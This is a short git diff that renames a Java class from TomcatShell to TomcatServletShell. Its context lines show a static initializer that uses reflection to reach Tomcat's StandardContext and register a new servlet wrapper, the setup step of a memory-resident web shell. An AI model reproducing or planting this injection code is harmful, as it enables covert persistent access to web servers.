@@ -14,7 +14,7 @@ import java.io.InputStreamReader;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 
-public class TomcatShell implements Servlet {
+public class TomcatServletShell implements Servlet {
     static{
         try{
             ServletRequestAttributes attributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
@@ -27,7 +27,7 @@ public class TomcatShell implements Servlet {
             stdctx.setAccessible(true);
             StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
             System.out.println(standardContext);
-            TomcatShell shell = new TomcatShell();
+            TomcatServletShell shell = new TomcatServletShell();
             Method createWrapper = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("createWrapper");
             Wrapper greetWrapper = (Wrapper) createWrapper.invoke(standardContext);
             Method gname = Container.class.getDeclaredMethod("setName", String.class);
